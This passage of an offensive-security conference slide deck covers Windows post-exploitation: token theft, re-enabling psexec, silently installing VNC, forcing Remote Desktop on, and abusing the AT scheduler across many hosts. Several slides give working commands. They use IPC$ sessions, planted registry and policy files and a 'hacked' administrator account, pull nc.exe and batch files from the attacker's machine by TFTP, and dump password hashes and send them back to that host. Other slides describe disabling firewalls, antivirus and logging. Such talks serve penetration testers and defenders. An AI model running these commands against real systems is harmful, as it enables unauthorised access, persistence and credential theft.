• User ID, domain credentials, sessions
• Impersonate system accounts
• Make activities look like normal user behavior
Slide: 41
User Identity Theft
• Stages and techniques
– Target users
• Who has access to what
• Where is the data?
– Change Identity
• Hijack credentials/sessions
• Abuse tokens
– Access is the end goal, be it data or another system
Slide: 42
User Identity Theft
• Existing tools
– Incognito (metasploit)
• Enumerate / hijack tokens
– FU/FUTO
• Enable SYSTEM privileges
• Change process privileges DKOM
– SU / SUDO / KSU
– Process injection
– Hijack domain credentials
Slide: 43
User Identity Theft
Tokens, Privileges, Security Descriptors, 
SID’s, SACL’s, DACL’s, ACE’s Oh’ My
• What we want
– Privileges or SID’s
• What we get
– Access, Access, Access
• How we get it
– Incognito vs. FUto
Slide: 44
• DEMOS
Slide: 45
Feature Modification
Slide: 46
Feature Modification 
• Changing existing features or settings to 
benefit our activities
• Goals
– Support all Post-Exploitation activities
– Disabling detection technologies
– Enabling in-secure or easy to use access 
software
Slide: 47
Feature Modification 
• Feature Modification is Basically Securable Object 
Manipulation
– Remember all those Tokens, and Security Descriptors?
– These can be modified programmatically and directly
• Not just through existing tools
– Stealth / Persistence requirements 
• May make it more advantageous to use custom tools
– Access Objects programmatically
– Can be much more complex to implement
Slide: 48
Feature Modification 
• Re-enabling disabled access
– PsExec: It’s still cool (Thanks Mark!)
• Enabling GUI access
– VNC (from a command line)
– Remote Desktop (even if disabled)
• Turning off or adding exceptions to security 
software
– Firewalls, AV, logging
• Modifying Local Security Policies
Slide: 49
Feature Modification 
• Enabling psexec
– Psexec was great, awesome remote 
shell/command tool
– Everybody now disables clipbook which 
psexec requires l4m3 
– Lets re-enable it !
Slide: 50
Feature Modification 
• Enabling psexec
• Use the system control tool sc.exe
– Net use \\target\ipc$ username /user:password
– Sc \\target config netdde start= auto
– Sc \\target config netddedsdm start= auto
– Sc \\target config clipsrv start= auto
– Sc \\target start netdde
– Sc \\target start netddedsdm
– Sc \\target start clipserv
Slide: 51
Feature Modification 
• Enabling VNC (from command line)
– Go get VNC (check out guh.nu!)
– Make a folder on the target for the vnc files
– Copy the following files to target folder:
•
Winvnc.exe
•
Vnc.reg
•
Vnchooks.dll
•
Omnithread_rt.dll 
– Regedit –s vnc.reg
– Winvnc –install
– Net start “vnc server”
– Winvnc
– Password is “infected”
Vnc.reg file contents:
[HKEY_LOCAL_MACHINE\SOFTWARE\ORL\WinVNC3\Default]
"SocketConnect"=dword:00000001
"AutoPortSelect"=dword:00000001
"InputsEnabled"=dword:00000001
"LocalInputsDisabled"=dword:00000000
"IdleTimeout"=dword:00000000
"QuerySetting"=dword:00000002
"QueryTimeout"=dword:0000000a
"PollUnderCursor"=dword:00000000
"PollForeground"=dword:00000001
"PollFullScreen"=dword:00000000
"OnlyPollConsole"=dword:00000001
"OnlyPollOnEvent"=dword:00000000
"Password"=hex:10,4d,89,3d,5a,e1,55,f8
Slide: 52
Feature Modification 
• Enabling Remote Desktop remotely
– Having a GUI to your target can be necessary 
– Maybe they are running a specialized GUI app
• Ex. System controlling access to security doors
– No command line way of modifying system, need GUI
• SCADA systems?
• Security cameras
• Who knows what you might be up to 
– Remote desktop is fast and already a feature of OS
– However it’s often disabled, maybe even by GPO
Slide: 53
Feature Modification 
• Enabling Remote Desktop remotely
– Complicated procedure, especially if GPO’s involved 
– Create a file named fix_ts_policy.ini
[Unicode]
Unicode=yes
[Version]
signature="$CHICAGO$"
Revision=1
[Privilege Rights]
seremoteinteractivelogonright = hacked_account
seinteractivelogonright = hacked_account
sedenyinteractivelogonright =
sedenyremoteinteractivelogonright =
sedenynetworklogonright =
– This file will fix policy settings in your way
– Change “hacked_account” to a real account
Slide: 54
Feature Modification 
• Enabling Remote Desktop remotely
– Create another file named enable_ts.reg
Windows Registry Editor Version 5.00
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]
"fDenyTSConnections"=dword:00000000
"TSEnabled"=dword:00000001
"TSUserEnabled"=dword:00000000
– Then perform these commands
•
sc config termservice start= auto
•
regedit /s enable_ts.reg
•
copy c:\windows\security\database\secedit.sdb
c:\windows\security\database\new.secedit.sdb
•
copy c:\windows\security\database\secedit.sdb 
c:\windows\security\database\orig.secedit.sdb
•
secedit /configure /db new.secedit.sdb /cfg fix_ts_policy.ini
•
gpupdate /Force
•
net start "terminal services"
Slide: 55
• DEMOS
Slide: 56
Abusing The Scheduler
Slide: 57
Abusing The Scheduler
•
Oldschool techniques can get 
results on new problems
•
Remember this is POST 
exploitation so you already have 
some access
•
AT command schedules things to 
run on at a specified time and 
date
–
Schedule service must be running 
Slide: 58
Abusing The Scheduler
•
Often these days certain features are 
disabled for security
–
Clipbook, shares, enumeration
•
Use AT to get around these problems
–
Usually NOT disabled
Net use \\target\ipc$ password /user:username
At \\target 12:00 pm command
Ex. At \\192.168.1.1 12:00pm tftp –I myip GET nc.exe
Slide: 59
Abusing The Scheduler
•
Often AT is still enabled while many other 
things you typically use are not
•
AT is as good as having a shell:
–
Enable / Start Services
–
Transfer files
–
Adding users
–
Messing with the registry / policies
–
Pretty much anything you can do with a shell
–
Added bonus, defaults to run as SYSTEM
Slide: 60
Abusing The Scheduler
•
Building a tool around AT 
–
Flow:
•
Establish authenticated session
•
Determine the time on the target
•
Pass commands to the target to be run 1 min from now
–
Write a batch file that executes everything at once
–
Have the target send you back whatever info you want
–
Be mindful of file transfer protocols, TFTP is good but not 
always “quiet” or available
Slide: 61
Abusing The Scheduler
•
Common use example
–
Net use \\target
–
Net time \\target
–
At \\target (net time +1min) “tftp –i use GET e.bat”
–
At \\target (net time +2min) e.bat
–
e.bat does:
•
Adds a user (net user hacked hacked /add)
–
Admin group (net localgroup administrators hacked /add)
•
Gets hashdumping tools and dumps hashes
•
Sends hashes, identified by IP back to attacker host
Slide: 62
Abusing The Scheduler
•
Privileges of LocalSystem that we care about
–
NT AUTHORITY\SYSTEM and 
BUILTIN\Administrators SIDs 
–
SE_IMPERSONATE_NAME 
–
SE_TCB_NAME 
–
SE_DEBUG_NAME 
Slide: 63
Massive Automation
Slide: 64
Massive Automation
•
Automating techniques and tools for use 
against massive numbers of hosts
•
Goals
–
Penetrate as many systems as possible 
with little interaction and in a short time
–
Ease of use / re-use
–
Lower cost of attack
Slide: 65
Massive Automation 
• MassNetUse – Establish netbios 
session / credentials on range of hosts
• MassWinenum – Enumerate Netbios 
information, bypass certain 
RestrictAnonymous settings
• AtAbuse – Use the scheduler as your 
“shell” to control ranges of hosts
Slide: 66
• DEMOS
Slide: 67
• Related talks you should see
– Beyond EIP – The theoretical / tool 
development end of things (spoonm & skape)
– Security Implications of Windows Access 
Tokens (Luke Jennings)
Slide: 68
• Acknowledgements
– Thanks to 
• All the people from #offensivecomputing, nologin, 
uninformed IRC and SILC channels
• HD Moore especially for support and mentorship 
• Danny Quist, krbklepto, Egypt, spoonm, skape 
• Luke Jennings for his awesome work
Slide: 69
• Questions ?
• Presentation available at
www.offensivecomputing.net